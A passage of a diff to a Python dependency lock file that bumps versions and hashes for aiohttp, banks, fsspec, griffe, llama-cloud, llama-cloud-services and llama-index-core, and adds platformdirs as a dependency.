-    {file = "aiohttp-3.11.14-cp312-cp312-manylinux_2_17_s390x.manylinux2014_s390x.whl", hash = "sha256:3b512f1de1c688f88dbe1b8bb1283f7fbeb7a2b2b26e743bb2193cbadfa6f307"},
-    {file = "aiohttp-3.11.14-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", hash = "sha256:cc9253069158d57e27d47a8453d8a2c5a370dc461374111b5184cf2f147a3cc3"},
-    {file = "aiohttp-3.11.14-cp312-cp312-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl", hash = "sha256:0b2501f1b981e70932b4a552fc9b3c942991c7ae429ea117e8fba57718cdeed0"},
-    {file = "aiohttp-3.11.14-cp312-cp312-musllinux_1_2_aarch64.whl", hash = "sha256:28a3d083819741592685762d51d789e6155411277050d08066537c5edc4066e6"},
-    {file = "aiohttp-3.11.14-cp312-cp312-musllinux_1_2_armv7l.whl", hash = "sha256:0df3788187559c262922846087e36228b75987f3ae31dd0a1e5ee1034090d42f"},
-    {file = "aiohttp-3.11.14-cp312-cp312-musllinux_1_2_i686.whl", hash = "sha256:9e73fa341d8b308bb799cf0ab6f55fc0461d27a9fa3e4582755a3d81a6af8c09"},
-    {file = "aiohttp-3.11.14-cp312-cp312-musllinux_1_2_ppc64le.whl", hash = "sha256:51ba80d473eb780a329d73ac8afa44aa71dfb521693ccea1dea8b9b5c4df45ce"},
-    {file = "aiohttp-3.11.14-cp312-cp312-musllinux_1_2_s390x.whl", hash = "sha256:8d1dd75aa4d855c7debaf1ef830ff2dfcc33f893c7db0af2423ee761ebffd22b"},
-    {file = "aiohttp-3.11.14-cp312-cp312-musllinux_1_2_x86_64.whl", hash = "sha256:41cf0cefd9e7b5c646c2ef529c8335e7eafd326f444cc1cdb0c47b6bc836f9be"},
-    {file = "aiohttp-3.11.14-cp312-cp312-win32.whl", hash = "sha256:948abc8952aff63de7b2c83bfe3f211c727da3a33c3a5866a0e2cf1ee1aa950f"},
-    {file = "aiohttp-3.11.14-cp312-cp312-win_amd64.whl", hash = "sha256:3b420d076a46f41ea48e5fcccb996f517af0d406267e31e6716f480a3d50d65c"},
-    {file = "aiohttp-3.11.14-cp313-cp313-macosx_10_13_universal2.whl", hash = "sha256:8d14e274828561db91e4178f0057a915f3af1757b94c2ca283cb34cbb6e00b50"},
-    {file = "aiohttp-3.11.14-cp313-cp313-macosx_10_13_x86_64.whl", hash = "sha256:f30fc72daf85486cdcdfc3f5e0aea9255493ef499e31582b34abadbfaafb0965"},
-    {file = "aiohttp-3.11.14-cp313-cp313-macosx_11_0_arm64.whl", hash = "sha256:4edcbe34e6dba0136e4cabf7568f5a434d89cc9de5d5155371acda275353d228"},
-    {file = "aiohttp-3.11.14-cp313-cp313-manylinux_2_17_aarch64.manylinux2014_aarch64.whl", hash = "sha256:1a7169ded15505f55a87f8f0812c94c9412623c744227b9e51083a72a48b68a5"},
-    {file = "aiohttp-3.11.14-cp313-cp313-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl", hash = "sha256:ad1f2fb9fe9b585ea4b436d6e998e71b50d2b087b694ab277b30e060c434e5db"},
-    {file = "aiohttp-3.11.14-cp313-cp313-manylinux_2_17_s390x.manylinux2014_s390x.whl", hash = "sha256:20412c7cc3720e47a47e63c0005f78c0c2370020f9f4770d7fc0075f397a9fb0"},
-    {file = "aiohttp-3.11.14-cp313-cp313-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", hash = "sha256:6dd9766da617855f7e85f27d2bf9a565ace04ba7c387323cd3e651ac4329db91"},
-    {file = "aiohttp-3.11.14-cp313-cp313-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl", hash = "sha256:599b66582f7276ebefbaa38adf37585e636b6a7a73382eb412f7bc0fc55fb73d"},
-    {file = "aiohttp-3.11.14-cp313-cp313-musllinux_1_2_aarch64.whl", hash = "sha256:b41693b7388324b80f9acfabd479bd1c84f0bc7e8f17bab4ecd9675e9ff9c734"},
-    {file = "aiohttp-3.11.14-cp313-cp313-musllinux_1_2_armv7l.whl", hash = "sha256:86135c32d06927339c8c5e64f96e4eee8825d928374b9b71a3c42379d7437058"},
-    {file = "aiohttp-3.11.14-cp313-cp313-musllinux_1_2_i686.whl", hash = "sha256:04eb541ce1e03edc1e3be1917a0f45ac703e913c21a940111df73a2c2db11d73"},
-    {file = "aiohttp-3.11.14-cp313-cp313-musllinux_1_2_ppc64le.whl", hash = "sha256:dc311634f6f28661a76cbc1c28ecf3b3a70a8edd67b69288ab7ca91058eb5a33"},
-    {file = "aiohttp-3.11.14-cp313-cp313-musllinux_1_2_s390x.whl", hash = "sha256:69bb252bfdca385ccabfd55f4cd740d421dd8c8ad438ded9637d81c228d0da49"},
-    {file = "aiohttp-3.11.14-cp313-cp313-musllinux_1_2_x86_64.whl", hash = "sha256:2b86efe23684b58a88e530c4ab5b20145f102916bbb2d82942cafec7bd36a647"},
-    {file = "aiohttp-3.11.14-cp313-cp313-win32.whl", hash = "sha256:b9c60d1de973ca94af02053d9b5111c4fbf97158e139b14f1be68337be267be6"},
-    {file = "aiohttp-3.11.14-cp313-cp313-win_amd64.whl", hash = "sha256:0a29be28e60e5610d2437b5b2fed61d6f3dcde898b57fb048aa5079271e7f6f3"},
-    {file = "aiohttp-3.11.14-cp39-cp39-macosx_10_9_universal2.whl", hash = "sha256:14fc03508359334edc76d35b2821832f092c8f092e4b356e74e38419dfe7b6de"},
-    {file = "aiohttp-3.11.14-cp39-cp39-macosx_10_9_x86_64.whl", hash = "sha256:92007c89a8cb7be35befa2732b0b32bf3a394c1b22ef2dff0ef12537d98a7bda"},
-    {file = "aiohttp-3.11.14-cp39-cp39-macosx_11_0_arm64.whl", hash = "sha256:6d3986112e34eaa36e280dc8286b9dd4cc1a5bcf328a7f147453e188f6fe148f"},
-    {file = "aiohttp-3.11.14-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl", hash = "sha256:749f1eb10e51dbbcdba9df2ef457ec060554842eea4d23874a3e26495f9e87b1"},
-    {file = "aiohttp-3.11.14-cp39-cp39-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl", hash = "sha256:781c8bd423dcc4641298c8c5a2a125c8b1c31e11f828e8d35c1d3a722af4c15a"},
-    {file = "aiohttp-3.11.14-cp39-cp39-manylinux_2_17_s390x.manylinux2014_s390x.whl", hash = "sha256:997b57e38aa7dc6caab843c5e042ab557bc83a2f91b7bd302e3c3aebbb9042a1"},
-    {file = "aiohttp-3.11.14-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", hash = "sha256:3a8b0321e40a833e381d127be993b7349d1564b756910b28b5f6588a159afef3"},
-    {file = "aiohttp-3.11.14-cp39-cp39-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl", hash = "sha256:8778620396e554b758b59773ab29c03b55047841d8894c5e335f12bfc45ebd28"},
-    {file = "aiohttp-3.11.14-cp39-cp39-musllinux_1_2_aarch64.whl", hash = "sha256:e906da0f2bcbf9b26cc2b144929e88cb3bf943dd1942b4e5af066056875c7618"},
-    {file = "aiohttp-3.11.14-cp39-cp39-musllinux_1_2_armv7l.whl", hash = "sha256:87f0e003fb4dd5810c7fbf47a1239eaa34cd929ef160e0a54c570883125c4831"},
-    {file = "aiohttp-3.11.14-cp39-cp39-musllinux_1_2_i686.whl", hash = "sha256:7f2dadece8b85596ac3ab1ec04b00694bdd62abc31e5618f524648d18d9dd7fa"},
-    {file = "aiohttp-3.11.14-cp39-cp39-musllinux_1_2_ppc64le.whl", hash = "sha256:fe846f0a98aa9913c2852b630cd39b4098f296e0907dd05f6c7b30d911afa4c3"},
-    {file = "aiohttp-3.11.14-cp39-cp39-musllinux_1_2_s390x.whl", hash = "sha256:ced66c5c6ad5bcaf9be54560398654779ec1c3695f1a9cf0ae5e3606694a000a"},
-    {file = "aiohttp-3.11.14-cp39-cp39-musllinux_1_2_x86_64.whl", hash = "sha256:a40087b82f83bd671cbeb5f582c233d196e9653220404a798798bfc0ee189fff"},
-    {file = "aiohttp-3.11.14-cp39-cp39-win32.whl", hash = "sha256:95d7787f2bcbf7cb46823036a8d64ccfbc2ffc7d52016b4044d901abceeba3db"},
-    {file = "aiohttp-3.11.14-cp39-cp39-win_amd64.whl", hash = "sha256:22a8107896877212130c58f74e64b77f7007cb03cea8698be317272643602d45"},
-    {file = "aiohttp-3.11.14.tar.gz", hash = "sha256:d6edc538c7480fa0a3b2bdd705f8010062d74700198da55d16498e1b49549b9c"},
+    {file = "aiohttp-3.11.15-cp310-cp310-macosx_10_9_universal2.whl", hash = "sha256:078b1ce274f967951b42a65d5b7ec115b7886343a5271f2eed330458ea87bb48"},
+    {file = "aiohttp-3.11.15-cp310-cp310-macosx_10_9_x86_64.whl", hash = "sha256:48d790d05c76b6cb93a1259b44d3f0019b61d507f8ebf0d49da3ef5ac858b05d"},
+    {file = "aiohttp-3.11.15-cp310-cp310-macosx_11_0_arm64.whl", hash = "sha256:e13767424425bb607931a0b9e703b95d2693650011ef8f0166b4cd80066b66b9"},
+    {file = "aiohttp-3.11.15-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl", hash = "sha256:7ac49c32901489343b4dab064ab520f6b879a03fb4f9667c84620b66f07bed69"},
+    {file = "aiohttp-3.11.15-cp310-cp310-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl", hash = "sha256:576b56a34d26ea8a8f0e1a30b8a069ba4ab121fb8eb796d1b89fedda7c74c553"},
+    {file = "aiohttp-3.11.15-cp310-cp310-manylinux_2_17_s390x.manylinux2014_s390x.whl", hash = "sha256:71ed71d9431e770550aab27a77ef9d30d33ce6f558ab7818be7205ae6aca635d"},
+    {file = "aiohttp-3.11.15-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", hash = "sha256:c982b2cbd7b8f4b31e9faf2de09e22b060a6cd0a693f20892dda41a8fb0f46ef"},
+    {file = "aiohttp-3.11.15-cp310-cp310-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl", hash = "sha256:f00e7540a60460fbeaffff4a7dcf72fe8b710f8280a542a4d798273787c64e72"},
+    {file = "aiohttp-3.11.15-cp310-cp310-musllinux_1_2_aarch64.whl", hash = "sha256:9b97fae7f75a0b666ce4281627856d1b1a85477f26c2e8b266292e770c17df36"},
+    {file = "aiohttp-3.11.15-cp310-cp310-musllinux_1_2_armv7l.whl", hash = "sha256:a449c48f5b02c0c14f5310881558ca861bff8e00b1f79be4cf6a53f638464c30"},
+    {file = "aiohttp-3.11.15-cp310-cp310-musllinux_1_2_i686.whl", hash = "sha256:8c6e39f0bb2418f839841f92b3cd64077ff5166d724c984ab450ca08d5e51d92"},
+    {file = "aiohttp-3.11.15-cp310-cp310-musllinux_1_2_ppc64le.whl", hash = "sha256:e792131352418dde7b0c598e217e89ecf6a26889f46f35f910e5544ffdebf3ae"},
+    {file = "aiohttp-3.11.15-cp310-cp310-musllinux_1_2_s390x.whl", hash = "sha256:c28cbae1ce76dc48d0fcccb045ac21d00dcc1b306bb745910cf35585ce89404e"},
+    {file = "aiohttp-3.11.15-cp310-cp310-musllinux_1_2_x86_64.whl", hash = "sha256:d9c8417a24063f35b526f8bf14f6f4bdea6f3f49850457337b6ea928901adbbc"},
+    {file = "aiohttp-3.11.15-cp310-cp310-win32.whl", hash = "sha256:a50b86eb9cf74fa5b6f1386e08e1520dcbe83d7dfd4c8bf6f2ca72b03d42e79f"},
+    {file = "aiohttp-3.11.15-cp310-cp310-win_amd64.whl", hash = "sha256:a0361cafb50b185356a5f346c169aea1d14783df99e6da714d626b104586e0b5"},
+    {file = "aiohttp-3.11.15-cp311-cp311-macosx_10_9_universal2.whl", hash = "sha256:5bd37d615cd26d09321bd0168305f8508778712cf38aeffeed550274fb48a2ee"},
+    {file = "aiohttp-3.11.15-cp311-cp311-macosx_10_9_x86_64.whl", hash = "sha256:a3d706afcc808f6add4208dfa13f911fd93c2a3dab6be484fee4fd0602a0867e"},
+    {file = "aiohttp-3.11.15-cp311-cp311-macosx_11_0_arm64.whl", hash = "sha256:43625253e3dc018d34867b70909149f15f29eac0382802afe027f2fbf17bcb9c"},
+    {file = "aiohttp-3.11.15-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl", hash = "sha256:437eee9e057a7907b11e4af2b18df56b6c795b28e0a3ac250691936cf6bf40eb"},
+    {file = "aiohttp-3.11.15-cp311-cp311-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl", hash = "sha256:ec3dd04138bd30e6a3403dbd3ab5a5ccfb501597c5a95196cd816936ed55b777"},
+    {file = "aiohttp-3.11.15-cp311-cp311-manylinux_2_17_s390x.manylinux2014_s390x.whl", hash = "sha256:85d73479b79172e7d667b466c170ca6097a334c09ecd83c95c210546031251b5"},
+    {file = "aiohttp-3.11.15-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", hash = "sha256:ae3a5d9f2fbe736fec7d24be25c57aa78c2d78d96540439ea68a8abbed9906fc"},
+    {file = "aiohttp-3.11.15-cp311-cp311-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl", hash = "sha256:269d145c593a65f78fb9a64dece90341561ddb2e91a96d42681132b2f706c42a"},
+    {file = "aiohttp-3.11.15-cp311-cp311-musllinux_1_2_aarch64.whl", hash = "sha256:0987dcf32e4c47f22634d32e4b0ffbc368bbcf2b33b408cd1a3d2dc0a6a5cd34"},
+    {file = "aiohttp-3.11.15-cp311-cp311-musllinux_1_2_armv7l.whl", hash = "sha256:7cf4b2b5a0f7a738ecd759eaeaef800fc7c57683b7be9d8a43fcb86ca62701b4"},
+    {file = "aiohttp-3.11.15-cp311-cp311-musllinux_1_2_i686.whl", hash = "sha256:f1e0369f0dc8c895e718ce37147f56d46142d37596be183ab7a34192c5e6e4c5"},
+    {file = "aiohttp-3.11.15-cp311-cp311-musllinux_1_2_ppc64le.whl", hash = "sha256:82ddf7f642b9c0b08063f3cf4e2818b22901bce8ebad05c232d9e295e77436a0"},
+    {file = "aiohttp-3.11.15-cp311-cp311-musllinux_1_2_s390x.whl", hash = "sha256:0c7eba0f90e27ec4af64db051f35387fa17128e6eeb58ee0f2318f2627168cc2"},
+    {file = "aiohttp-3.11.15-cp311-cp311-musllinux_1_2_x86_64.whl", hash = "sha256:5a61df20fa77792e83307e266f76790f7cb67980dd476948948de212ee7ec64c"},
+    {file = "aiohttp-3.11.15-cp311-cp311-win32.whl", hash = "sha256:be11989cbc0728f81c0d022cef140ef8adb20d3012ad8f0ac61853bef571eb52"},
+    {file = "aiohttp-3.11.15-cp311-cp311-win_amd64.whl", hash = "sha256:357355c9d51c8b12bbc7de43b27ce4b51f14cce050e00b5a87d0d5527d779395"},
+    {file = "aiohttp-3.11.15-cp312-cp312-macosx_10_13_universal2.whl", hash = "sha256:433e7388b3063bba462b3362641988270b087a9ccae22390364f86b37a480c17"},
+    {file = "aiohttp-3.11.15-cp312-cp312-macosx_10_13_x86_64.whl", hash = "sha256:d99981304065f4ea407dd7495f74f8b8c10f0e26733f8a47dc174ece73744d14"},
+    {file = "aiohttp-3.11.15-cp312-cp312-macosx_11_0_arm64.whl", hash = "sha256:a3739daa52c0cff42f1c40f63b2fe818fcf41019d84c80a7add3224207a7060f"},
+    {file = "aiohttp-3.11.15-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl", hash = "sha256:6fd82d0b3f73c59c80dade0ca8e0342de1ee261e147140ade65a465be670e83c"},
+    {file = "aiohttp-3.11.15-cp312-cp312-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl", hash = "sha256:c930064b79cc0eb63678e376b819d546b0e2360264cd7544c32119496f646f35"},
+    {file = "aiohttp-3.11.15-cp312-cp312-manylinux_2_17_s390x.manylinux2014_s390x.whl", hash = "sha256:291f324f49ecede693dfb4820a412d1388cb10a2214ab60028252b505e105d6f"},
+    {file = "aiohttp-3.11.15-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", hash = "sha256:65eb40e74e3126cba185da7a78815cf3a30140932193831b3bfd73c79965c723"},
+    {file = "aiohttp-3.11.15-cp312-cp312-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl", hash = "sha256:a6d6d86443580f846ec9cf60f899b7cace34411f2ff5c95db5970047195e5bfa"},
+    {file = "aiohttp-3.11.15-cp312-cp312-musllinux_1_2_aarch64.whl", hash = "sha256:8b4d8d78fbd5290204dcf43957a2184acd5cee358f203f24a3a97f7d7984eeb7"},
+    {file = "aiohttp-3.11.15-cp312-cp312-musllinux_1_2_armv7l.whl", hash = "sha256:94c552a4864ed292dadf1d341213374284a3af72e49bea02e70ce6f07cb37004"},
+    {file = "aiohttp-3.11.15-cp312-cp312-musllinux_1_2_i686.whl", hash = "sha256:23857adc919b64bba8a4db0eccb24e53fcaf85633e690ef1581c5562ed58cae7"},
+    {file = "aiohttp-3.11.15-cp312-cp312-musllinux_1_2_ppc64le.whl", hash = "sha256:eba325409a0f990f9b43ed18916cbf5b9779bc4c979b8887c444e7be9c38ccca"},
+    {file = "aiohttp-3.11.15-cp312-cp312-musllinux_1_2_s390x.whl", hash = "sha256:f1b6c639750bf2a228957e25fcab7a7ff11987c543d70bf73223369f0d7bdb27"},
+    {file = "aiohttp-3.11.15-cp312-cp312-musllinux_1_2_x86_64.whl", hash = "sha256:2241d862dc6a3c0c2662a6934e79078d3a1e51a76c0dca5d65b30f3debee6c9b"},
+    {file = "aiohttp-3.11.15-cp312-cp312-win32.whl", hash = "sha256:18733fa6bbe44698ff96138c1f1d682bbdf0846250a42c25c108eed328fef0d4"},
+    {file = "aiohttp-3.11.15-cp312-cp312-win_amd64.whl", hash = "sha256:0ec98c22030ea2a430cb11afddda7d4737b7e5c236c704f0d7d15504978598f7"},
+    {file = "aiohttp-3.11.15-cp313-cp313-macosx_10_13_universal2.whl", hash = "sha256:c37aa3eb8eb92f3793f0c1e73f212a76cbc8d363e9990df54b5b7099f75ce740"},
+    {file = "aiohttp-3.11.15-cp313-cp313-macosx_10_13_x86_64.whl", hash = "sha256:5b5edd482ff0a8585b3f4e8b3681819447324166a43a5588800a5bca340dbf27"},
+    {file = "aiohttp-3.11.15-cp313-cp313-macosx_11_0_arm64.whl", hash = "sha256:45d8c22c91bdb7417bd4f5119242dbd2e2140c0e9de47342c765f127f897eb57"},
+    {file = "aiohttp-3.11.15-cp313-cp313-manylinux_2_17_aarch64.manylinux2014_aarch64.whl", hash = "sha256:4b03093d4140d926965d23497a059ec59c8c07e602d2489ce5fb990f3a897db4"},
+    {file = "aiohttp-3.11.15-cp313-cp313-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl", hash = "sha256:05eea49d598c4ece6f285e00464de206f838b48ff21938d5aa9c394e115945b9"},
+    {file = "aiohttp-3.11.15-cp313-cp313-manylinux_2_17_s390x.manylinux2014_s390x.whl", hash = "sha256:63f8d6106566f98fcfde7a643c9da52d90679b8592dea76c4adfc3cd5d06d22c"},
+    {file = "aiohttp-3.11.15-cp313-cp313-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", hash = "sha256:36a490f1ebe0b982366314c77f02258f87bd5d9bd362839dc6a24188447f37eb"},
+    {file = "aiohttp-3.11.15-cp313-cp313-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl", hash = "sha256:73a7f6283634dd30f93b9a67c414c00517869478b50361c503535e075fa07eaf"},
+    {file = "aiohttp-3.11.15-cp313-cp313-musllinux_1_2_aarch64.whl", hash = "sha256:0e97c1e55f6931f07ecaf53aef8352def8386adfd0cd3caa6429cc40e886d6a9"},
+    {file = "aiohttp-3.11.15-cp313-cp313-musllinux_1_2_armv7l.whl", hash = "sha256:d8370d31e6d8ecccd97cd791c466d0acb56527df51b0c105d7ea54c7fcc0f75b"},
+    {file = "aiohttp-3.11.15-cp313-cp313-musllinux_1_2_i686.whl", hash = "sha256:c2de66177e087999568638c02639cf0248011b5c7fca69b006947153c534fcab"},
+    {file = "aiohttp-3.11.15-cp313-cp313-musllinux_1_2_ppc64le.whl", hash = "sha256:edcddb97574402ff7481bc6f70819ba863e77b0be58a840ed5f59d52d2f20a71"},
+    {file = "aiohttp-3.11.15-cp313-cp313-musllinux_1_2_s390x.whl", hash = "sha256:29cce2a7e009494e675018c0b1819a133befbab8629c797276c5d793bbdf1138"},
+    {file = "aiohttp-3.11.15-cp313-cp313-musllinux_1_2_x86_64.whl", hash = "sha256:825ec92391e3e4ddda74de79ed0f8b443e9b412a0c9c82618ca2163abd875df5"},
+    {file = "aiohttp-3.11.15-cp313-cp313-win32.whl", hash = "sha256:430f9707f0c1239a92bff7769b0db185ef400278dc63c89f88ed1bd5153aab7a"},
+    {file = "aiohttp-3.11.15-cp313-cp313-win_amd64.whl", hash = "sha256:f30e6980ec5d6ad815a233e19e39fe27ea94b1081c31c8aa1df1b629da3737b8"},
+    {file = "aiohttp-3.11.15-cp39-cp39-macosx_10_9_universal2.whl", hash = "sha256:03ce9d2f01aef26cd6aaba2f330273c2364237db2f499b93c3e9f2e249f83cd2"},
+    {file = "aiohttp-3.11.15-cp39-cp39-macosx_10_9_x86_64.whl", hash = "sha256:1bee0f9e2d4088b57243d63afcb06256bd2d9ff683080f51e74fa790c8cfedfd"},
+    {file = "aiohttp-3.11.15-cp39-cp39-macosx_11_0_arm64.whl", hash = "sha256:7e20bd6aa51a5209c9131395e20ce126e8e317c0cf78a8180f026b4d73f018f6"},
+    {file = "aiohttp-3.11.15-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl", hash = "sha256:23397670f3739b6f3c4019da8226190f6cce5ab2008b664ed96a6d1f0fe7f069"},
+    {file = "aiohttp-3.11.15-cp39-cp39-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl", hash = "sha256:fc270fe480e7e425c45054543f58510fe649f70b77f514171909bbfe585105c0"},
+    {file = "aiohttp-3.11.15-cp39-cp39-manylinux_2_17_s390x.manylinux2014_s390x.whl", hash = "sha256:84370ff70c1677ee0c4db40fe2baee6ffc72e9d32def3ff18739c1390c62329f"},
+    {file = "aiohttp-3.11.15-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", hash = "sha256:379882ab6a40e6e0879ad8e84dca74ddbadff94af4f314b59b7da89c8463a669"},
+    {file = "aiohttp-3.11.15-cp39-cp39-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl", hash = "sha256:74afb637cd06760afe0aa55a3ce82178ef4c950be65935add8f3809f701f36ca"},
+    {file = "aiohttp-3.11.15-cp39-cp39-musllinux_1_2_aarch64.whl", hash = "sha256:558de86eef9a886e43c6ae5b75cecdce81203da5832d19d11da8de417967d478"},
+    {file = "aiohttp-3.11.15-cp39-cp39-musllinux_1_2_armv7l.whl", hash = "sha256:41f82df6f0f895f0f843bc86762bea45b4d0fe876de49239ffc89d2365426399"},
+    {file = "aiohttp-3.11.15-cp39-cp39-musllinux_1_2_i686.whl", hash = "sha256:38368a32530dcdeccfa47544cf66724118d9cc8a889c057e116723ab62994380"},
+    {file = "aiohttp-3.11.15-cp39-cp39-musllinux_1_2_ppc64le.whl", hash = "sha256:204f6695b47a7d130ddf6680158920825d0d32202a870e0bc56a2ec637935b1a"},
+    {file = "aiohttp-3.11.15-cp39-cp39-musllinux_1_2_s390x.whl", hash = "sha256:4b85486e8914d4e778343f5322834aada678eaf4c5315e50d41d9b74817ff97b"},
+    {file = "aiohttp-3.11.15-cp39-cp39-musllinux_1_2_x86_64.whl", hash = "sha256:79a08d675167c50f41d106d67bbcbc9e86e1b43d305c4b9f982d5c656a94a9ba"},
+    {file = "aiohttp-3.11.15-cp39-cp39-win32.whl", hash = "sha256:20dda85988a4f506bf5a457b416b238e32ab944a2deb878ddf0af92df9254a9b"},
+    {file = "aiohttp-3.11.15-cp39-cp39-win_amd64.whl", hash = "sha256:3cfd9f4aeaec4a75a0b4986a9977ac0a09b3d87ae83415e4b461e86715c80897"},
+    {file = "aiohttp-3.11.15.tar.gz", hash = "sha256:b9b9a1e592ac8fcc4584baea240e41f77415e0de98932fdf19565aa3b6a02d0b"},
 ]
 
 [package.dependencies]
@@ -270,13 +270,13 @@ extras = ["regex"]
 
 [[package]]
 name = "banks"
-version = "2.0.0"
+version = "2.1.1"
 description = "A prompt programming language"
 optional = false
 python-versions = ">=3.9"
 files = [
-    {file = "banks-2.0.0-py3-none-any.whl", hash = "sha256:26eeca39f2d5e41ac29661cfcfbff9a3f4adf79e0ddfb05ca29e79aa15d337af"},
-    {file = "banks-2.0.0.tar.gz", hash = "sha256:036b7990f690a8282905fdc6970627efd3e7f1d05f09d6d39a565ef4e9b1971a"},
+    {file = "banks-2.1.1-py3-none-any.whl", hash = "sha256:06e4ee46a0ff2fcdf5f64a5f028a7b7ceb719d5c7b9339f5aa90b24936fbb7f5"},
+    {file = "banks-2.1.1.tar.gz", hash = "sha256:95ec9c8f3c173c9f1c21eb2451ba0e21dda87f1ceb738854fabadb54bc387b86"},
 ]
 
 [package.dependencies]
@@ -284,6 +284,7 @@ deprecated = "*"
 eval-type-backport = {version = "*", markers = "python_version < \"3.10\""}
 griffe = "*"
 jinja2 = "*"
+platformdirs = "*"
 pydantic = "*"
 
 [package.extras]
@@ -1013,13 +1014,13 @@ files = [
 
 [[package]]
 name = "fsspec"
-version = "2025.3.0"
+version = "2025.3.2"
 description = "File-system specification"
 optional = false
-python-versions = ">=3.8"
+python-versions = ">=3.9"
 files = [
-    {file = "fsspec-2025.3.0-py3-none-any.whl", hash = "sha256:efb87af3efa9103f94ca91a7f8cb7a4df91af9f74fc106c9c7ea0efd7277c1b3"},
-    {file = "fsspec-2025.3.0.tar.gz", hash = "sha256:a935fd1ea872591f2b5148907d103488fc523295e6c64b835cfad8c3eca44972"},
+    {file = "fsspec-2025.3.2-py3-none-any.whl", hash = "sha256:2daf8dc3d1dfa65b6aa37748d112773a7a08416f6c70d96b264c96476ecaf711"},
+    {file = "fsspec-2025.3.2.tar.gz", hash = "sha256:e52c77ef398680bbd6a98c0e628fbc469491282981209907bbc8aea76a04fdc6"},
 ]
 
 [package.extras]
@@ -1155,13 +1156,13 @@ test = ["objgraph", "psutil"]
 
 [[package]]
 name = "griffe"
-version = "1.7.0"
+version = "1.7.2"
 description = "Signatures for entire Python programs. Extract the structure, the frame, the skeleton of your project, to generate API documentation or find breaking changes in your API."
 optional = false
 python-versions = ">=3.9"
 files = [
-    {file = "griffe-1.7.0-py3-none-any.whl", hash = "sha256:6b44efc53a3f290d42c4da521f42235177b3bd107877dd55955318a37930c572"},
-    {file = "griffe-1.7.0.tar.gz", hash = "sha256:72e9c1593c7af92a387906293fc4a318c2e8e8aef501c64678c809794b4bdca4"},
+    {file = "griffe-1.7.2-py3-none-any.whl", hash = "sha256:1ed9c2e338a75741fc82083fe5a1bc89cb6142efe126194cc313e34ee6af5423"},
+    {file = "griffe-1.7.2.tar.gz", hash = "sha256:98d396d803fab3b680c2608f300872fd57019ed82f0672f5b5323a9ad18c540c"},
 ]
 
 [package.dependencies]
@@ -1667,13 +1668,13 @@ files = [
 
 [[package]]
 name = "llama-cloud"
-version = "0.1.16"
+version = "0.1.17"
 description = ""
 optional = false
 python-versions = "<4,>=3.8"
 files = [
-    {file = "llama_cloud-0.1.16-py3-none-any.whl", hash = "sha256:a484cf762d2741282f96033c0c09f6c8ad1b93b4efb7520088647fd845d341d4"},
-    {file = "llama_cloud-0.1.16.tar.gz", hash = "sha256:fc68b24471907958d4862a3db1e973513de76d42f58c29d935b92c06cb1f4e3e"},
+    {file = "llama_cloud-0.1.17-py3-none-any.whl", hash = "sha256:4c13267c23d336227176d33ef9cd091f77aded4e1c9c6e7031a3b0ecfe7d5c8d"},
+    {file = "llama_cloud-0.1.17.tar.gz", hash = "sha256:f351fa0f1f5b6b9bce650eda78fc84511ba72c09bdafd4525fde6b7a4aac20f3"},
 ]
 
 [package.dependencies]
@@ -1683,20 +1684,21 @@ pydantic = ">=1.10"
 
 [[package]]
 name = "llama-cloud-services"
-version = "0.6.8"
+version = "0.6.9"
 description = "Tailored SDK clients for LlamaCloud services."
 optional = false
 python-versions = "<4.0,>=3.9"
 files = [
-    {file = "llama_cloud_services-0.6.8-py3-none-any.whl", hash = "sha256:d59f6b294bf59d840486dbba9c1ff9424b646f572b3b4b131d7a2793cb64dc08"},
-    {file = "llama_cloud_services-0.6.8.tar.gz", hash = "sha256:572c2b955bbf8ba2bbd5ec80d5fbdb92185fd9a4f8134b82a87ac43165d47732"},
+    {file = "llama_cloud_services-0.6.9-py3-none-any.whl", hash = "sha256:fd3705b471a72bb31f3f20e4d4131b81f7e0ddae0c044197660a4741347ef2c4"},
+    {file = "llama_cloud_services-0.6.9.tar.gz", hash = "sha256:aa3ba309f64723abd30b8fbb2dd99349d616cc79e09e37c52e10a69e84fe8d48"},
 ]
 
 [package.dependencies]
 click = ">=8.1.7,<9.0.0"
 eval-type-backport = {version = ">=0.2.0,<0.3.0", markers = "python_version < \"3.10\""}
-llama-cloud = ">=0.1.16,<0.2.0"
+llama-cloud = ">=0.1.17,<0.2.0"
 llama-index-core = ">=0.11.0"
+platformdirs = ">=4.3.7,<5.0.0"
 pydantic = "!=2.10"
 python-dotenv = ">=1.0.1,<2.0.0"
 
@@ -1734,13 +1736,13 @@ llama-index-llms-openai = ">=0.3.0,<0.4.0"
 
 [[package]]
 name = "llama-index-core"
-version = "0.12.27"
+version = "0.12.28"
 description = "Interface between LLMs and your data"
 optional = false
 python-versions = "<4.0,>=3.9"
 files = [
